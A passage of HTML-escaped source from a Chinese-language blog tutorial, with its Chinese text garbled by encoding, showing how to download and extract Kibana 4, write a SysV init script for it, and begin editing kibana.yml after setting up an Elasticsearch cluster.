class=&quot;string&quot;&gt;&quot;10.47.88.188:9300&quot;&lt;/span&gt;]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶åé‡å¯æœåŠ¡ï¼ŒæŸ¥çœ‹é›†ç¾¤èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;es-02å®‰è£…Kibana&quot;&gt;&lt;a href=&quot;#es-02å®‰è£…Kibana&quot; class=&quot;headerlink&quot; title=&quot;es_02å®‰è£…Kibana:&quot;&gt;&lt;/a&gt;es_02å®‰è£…Kibana:&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;96&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;98&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;99&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;102&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;104&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;105&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;106&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;107&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;108&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;109&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;110&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;111&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;112&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;113&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;114&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;115&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;116&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;117&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;118&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;åˆ°https://www.elastic.co/downloads/kibana  æ‰¾åˆé€‚çš„ç‰ˆæœ¬ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget https://download.elastic.co/kibana/kibana/kibana-4.5.1-linux-x64.tar.gz&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#è§£å‹&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ï¼ƒtar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ï¼ƒ&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt;  /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/ &amp;amp;&amp;amp; mv kibana-4.1.2-linux-x64 kibana&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#åˆ›å»ºkibanaå¯åŠ¨è„šæœ¬æœåŠ¡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;vi /etc/rc.d/init.d/kibana&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### BEGIN INIT INFO&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Provides:          kibana&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Default-Start:     2 3 4 5&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Default-Stop:      0 1 6&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Short-Description: Runs kibana daemon&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Description: Runs the kibana daemon as a non-root user&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### END INIT INFO&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Process name&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;NAME=kibana&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DESC=&lt;span class=&quot;string&quot;&gt;&quot;Kibana4&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PROG=&lt;span class=&quot;string&quot;&gt;&quot;/etc/init.d/kibana&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Configure location of Kibana bin&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KIBANA_BIN=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kibana/bin&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# PID Info&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID_FOLDER=/var/run/kibana/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID_FILE=/var/run/kibana/&lt;span class=&quot;variable&quot;&gt;$NAME&lt;/span&gt;.pid&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LOCK_FILE=/var/lock/subsys/&lt;span class=&quot;variable&quot;&gt;$NAME&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PATH=/bin:/usr/bin:/sbin:/usr/sbin:&lt;span class=&quot;variable&quot;&gt;$KIBANA_BIN&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DAEMON=&lt;span class=&quot;variable&quot;&gt;$KIBANA_BIN&lt;/span&gt;/&lt;span class=&quot;variable&quot;&gt;$NAME&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Configure User to run daemon process&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DAEMON_USER=root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Configure logging location&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KIBANA_LOG=/var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/kibana.log&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Begin Script&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;RETVAL=0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ `id -u` &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;You need root privileges to run this script&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Function library&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;. /etc/init.d/&lt;span class=&quot;built_in&quot;&gt;functions&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;start&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;string&quot;&gt;&quot;Starting &lt;span class=&quot;variable&quot;&gt;$DESC&lt;/span&gt; : &quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pid=`pidofproc -p &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; kibana`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ -n &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$pid&lt;/span&gt;&quot;&lt;/span&gt; ] ; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Already running.&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;# Start Daemon&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$PID_FOLDER&lt;/span&gt;&quot;&lt;/span&gt; ] ; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        mkdir &lt;span class=&quot;variable&quot;&gt;$PID_FOLDER&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;daemon --user=&lt;span class=&quot;variable&quot;&gt;$DAEMON_USER&lt;/span&gt; --pidfile=&lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$DAEMON&lt;/span&gt; 1&amp;gt;&lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$KIBANA_LOG&lt;/span&gt;&quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                sleep 2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                pidofproc node &amp;gt; &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                RETVAL=$?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                [[ $? &lt;span class=&quot;_&quot;&gt;-eq&lt;/span&gt; 0 ]] &amp;amp;&amp;amp; success || failure&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                [ &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt; = 0 ] &amp;amp;&amp;amp; touch &lt;span class=&quot;variable&quot;&gt;$LOCK_FILE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;reload&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Reload command is not implemented for this service.&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;stop&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;string&quot;&gt;&quot;Stopping &lt;span class=&quot;variable&quot;&gt;$DESC&lt;/span&gt; : &quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        killproc -p &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$DAEMON&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        RETVAL=$?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        [ &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt; = 0 ] &amp;amp;&amp;amp; rm &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$LOCK_FILE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt;&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  start)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  stop)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        stop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  status)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        status -p &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$DAEMON&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        RETVAL=$?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  restart)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        stop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  reload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;reload&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  *)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Invalid Arguments, print the following message.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Usage: &lt;span class=&quot;variable&quot;&gt;$0&lt;/span&gt; &amp;#123;start|stop|status|restart&amp;#125;&quot;&lt;/span&gt; &amp;gt;&amp;amp;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;esac&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¿®æ”¹å¯åŠ¨æƒé™&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chmod +x /etc/rc.d/init.d/kibana&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é…ç½®Kibanaï¼š&lt;/p&gt;
&lt;h3 id=&quot;ç¼–è¾‘kibana-yaml-ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host-å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP&quot;&gt;&lt;a href=&quot;#ç¼–è¾‘kibana-yaml-ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host-å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP&quot; class=&quot;headerlink&quot; title=&quot;ç¼–è¾‘kibana.yaml  ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP&quot;&gt;&lt;/a&gt;ç¼–è¾‘kibana.yaml  ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kibana/config/kibana.yml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Kibana is served by a back end server. This controls which port to use.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server.port: 5601&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span 